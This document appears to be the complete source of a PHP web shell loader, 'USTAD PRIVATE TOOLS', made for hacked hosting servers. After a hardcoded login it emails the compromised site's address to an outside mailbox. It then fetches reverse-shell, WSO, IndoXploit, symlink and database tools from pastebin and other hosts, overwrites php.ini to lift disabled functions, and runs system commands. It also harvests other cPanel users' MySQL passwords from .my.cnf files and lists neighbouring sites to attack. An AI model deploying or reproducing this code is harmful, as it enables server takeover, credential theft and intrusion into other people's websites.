<?
error_reporting(0);
ob_start();
session_start();
ob_end_clean();
$host = $_SERVER['HTTP_HOST'];
$user=$_GET["username"];
$pass=$_GET["password"];
if($user=="dian" AND $pass=="lusi")
{
$_SESSION["username"]=$user;
}
?>
<title>USTAD PRIVATE TOOLS</title>
<link href="http://fonts.googleapis.com/css?family=Share+Tech+Mono" rel="stylesheet" type="text/css">
<style>
body {background:#2F302F;color:#fff;font-family: 'Share Tech Mono';}
input[type=text] , input[type=password] {background:none;border-top:none;border-left:none;border-right:none;color: #02BC8C ;border-bottom:2px solid #02BC8C;font-family: 'Share Tech Mono';padding:2px 8px; -moz-border-radius: 7px; border-radius: 7px;width:30%;}
input[type=submit] {background:#02BC8C;color:white;border:1px solid #02BC8C;font-family: 'Share Tech Mono';padding:2px 8px; -moz-border-radius: 10px; border-radius: 10px;width:10%;}
.fak {background: #02BC8C ;color:#fff;border:1px solid #02BC8C;font-family: 'Share Tech Mono';padding:2px 8px; -moz-border-radius: 7px; border-radius: 7px;width:15%;}
a {text-decoration:none;color:#02BC8C}
</style>
<br><br>
<b>
<?php
error_reporting(0);
ob_start();
session_start();
ob_end_clean();
$subject = "Setor Guys -> ".$host;
$message = "Link : ".$host."/".$_SERVER['PHP_SELF']."?user=$user&pass=$pass"; if(isset($_SESSION["username"])){
mail("archbot88@gmail.com",$subject,$message,"From: $host" );
// logout
if(isset($_GET['logout'])){
ob_start();
session_start();
ob_end_clean();
session_destroy();
}
/* UstadCage_48 */
$p = $_SERVER["HTTP_HOST"];
$content = file_get_contents('https://pastebin.com/raw/ay6E1zT9');
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/history.html","w");
if(fwrite($fp,$content)){
$suck = "<font color=#02BC8C>OK</font>";
$url = "http://$p/history.html";
}else{
$suck = "<font color=#F64747>ERROR</font>";
$url = "/";
}
fclose($fp);
// bypass
$by = "disable_functions = none";
$byy = fopen('php.ini', 'w');
fwrite($byy,$by);
fclose($byy);
// fm
$get = file_get_contents('https://pastebin.com/raw/vKfyPDA3');
$bwt = fopen('fm.php', 'w');
if(fwrite($bwt,$get)){
$fm = "<a class=fak href=\"fm.php\">File Man</a>";
}else{
$fm = "<a class=fak>File Man</a>";
}
fclose($fp);
// rshell
$rs = file_get_contents('http://pastebin.com/raw/XSiWPYNg');
$rs1 = fopen('rs.php', 'w');
if(fwrite($rs1,$rs)){
$rs2 = "<a class='fak' href='rs.php'>Rshell</a>";
} else {
$rs2 = "<a class=fak>Rshell</a>";
}
fclose($rs1);
// idx
$idx = file_get_contents('http://pastebin.com/raw/nC6pWh5a');
$idx1 = fopen('idx.php', 'w');
if(fwrite($idx1,$idx)){
$idx2 = "<a class='fak' href='idx.php'>IndoXploit</a>";
} else {
$idx2 = "<a class=fak>IndoXploit</a>";
}
fclose($idx1);
// wso
$wso = file_get_contents('http://0x01.yn.lt/wso.css');
$wso1 = fopen('wso.php', 'w');
if(fwrite($wso1,$wso)){
$wso2 = "<a class='fak' href='wso.php'>Wso Shell</a>";
} else {
$wso2 = "<a class=fak>Wso Shell</a>";
}
fclose($wso1);
// Database
$db = file_get_contents('http://pastebin.com/raw/t9DcSpxE');
$db1 = fopen('db.php', 'w');
if(fwrite($db1,$db)){
$db2 = "<a class='fak' href='db.php'>Database</a>";
} else {
$db2 = "<a class=fak>Database</a>";
}
fclose($db1);
// Sym
$sym = file_get_contents('http://pastebin.com/raw/kY4XmPVv');
$sym1 = fopen('sym.php', 'w');
if(fwrite($sym1,$sym)){
$sym2 = "<a class='fak' href='sym.php'>Symlink</a>";
} else {
$sym2 = "<a class=fak>Symlink</a>";
}
fclose($sym1);
// exe
function exe($cmd) {
if(function_exists('system')){ 		
@ob_start(); 		
@system($cmd); 		
$buff = @ob_get_contents();
@ob_end_clean(); 		
return $buff; 	
} elseif(function_exists('exec')){ 		
@exec($cmd,$results); 		
$buff = ""; 		
foreach($results as $result) { 			
$buff .= $result; 		
}
return $buff; 	
} elseif(function_exists('passthru')){ 		
@ob_start(); 		
@passthru($cmd); 		
$buff = @ob_get_contents();
@ob_end_clean(); 		
return $buff; 	
} elseif(function_exists('shell_exec')){ 		
$buff = @shell_exec($cmd); 		
return $buff; 	
} 
}
// info
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=#F64747>ON</font>" : "<font color=#18BC9C>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=#18BC9C>ON</font>" : "<font color=#F64747>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=#18BC9C>ON</font>" : "<font color=#F64747>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=#18BC9C>ON</font>" : "<font color=#F64747>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=#F64747>ON</font>" : "<font color=#18BC9C>NONE</font>";
$user = @get_current_user();
$uid = @getmyuid();
$gid = @getmygid();
// lets
echo "<center><font new size='7'>USTAD PRIVATE TOOLS</font><br>".php_uname()."<br>Safe_Mod : $sm | IP : $ip | User : $user($uid/$gid) | Dis : $show_ds | Mysql : $mysql | cURL : $curl <br>root@ndutt : ".getcwd()." [ <a href='$url'>$suck</a> ]";
// menu
echo "<br><br>$fm $rs2 $idx2 $wso2 $sym2 $db2<br><br>";
echo "&copy; 2016 - 2018 UstadCage_48 - BebyYers ~";
// domain
$file = @implode(@file("/etc/named.conf"));
preg_match_all("#named/(.*?).db#",$file ,$r);
$domains = array_unique($r[1]);
{
$do = "".count($domains)."";
echo "<br>Ada [ ".$do." ] Domain";
}
// cp
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[$i]);
return trim($ar1[0]);
}
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
if($domains or $d0mains){
$domains = scandir("/var/named");
if($domains) {
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
$dc++;
}}}
$total = $dc;
echo '<br>'.$total.' Cpanel Berhasil Di Crack <br />';
}else{
$d0mains = @file('/etc/named.conf');
if($d0mains){
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
if(@eregi('zone',$d0main)){
preg_match_all('#zone "(.*)"#',$d0main,$domain);
flush();
if(strlen(trim($domain[1][0])) >2){
$mck[] = $domain[1][0];
}}}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
$infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
$usr[] = $infos['name'];
$dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
$r = explode(':',$d);
if(strpos($r[5],'home')){
$passwd[$r[0]] = $r[5];
}}
$l=0;
$j=1;
foreach($usr as $r){
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
$dc++;
flush();
$l=$l?0:1;
$j++;
}}}
$total = $dc;
echo '<br>'.$total.' Cpanel Berhasil Di Crack <br />';
}
}else{
echo "<br><font color='#fff'>Info Cpanel : </font> <font color='#02BC8C'> Not Accessible!</font><br>";
}
// jump
set_time_limit(0);
@$passwd = fopen('/etc/passwd','r');
if(!$passwd){ die('<b> Jumping Info : <font color="#02BC8C">Wew Ternyata Tidak Ada Web Yg Bisa Di Ikeh Ikeh >_< </font></b>'); }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd)){
$str = fgets($passwd);
if($i > 35){
$pos = strpos($str,':');
$username = substr($str,0,$pos);
$dirz = '/home/'.$username.'/public_html/';
if(($username != '')){
if(is_readable($dirz)){
array_push($users,$username);
array_push($pub,$dirz);
}}}
$i++;
}
echo " Jumping Info : Di Temukan <font color=#02BC8C> ".sizeof($users)." </font> Web Dalam Server $ip >_<"."<br />";
}else{
echo '<center>
UstadCage_48 Private Tools<br><pre>
─╔╗╔╗────╔╗────╔╦╗
╔╝║║╚╗╔═╗║╚╗╔╦╗║║║
║╬║║║║║╩╣║╔╣║╔╝╠╗║
╚═╝╚╩╝╚═╝╚═╝╚╝─╚═╝
</font>
</pre>"RES7OCK CREW"<br>
'.$_SERVER['HTTP_HOST'].'
<form method="GET" action="">
<p><input type="text" name="username" value="" placeholder="User"></p>
<p><input type="password" name="password" value="" placeholder="Pass"></p>
<p><input type="submit" name="commit" value="Login"></p>
</form>
</center>
';
}
?>
</b>
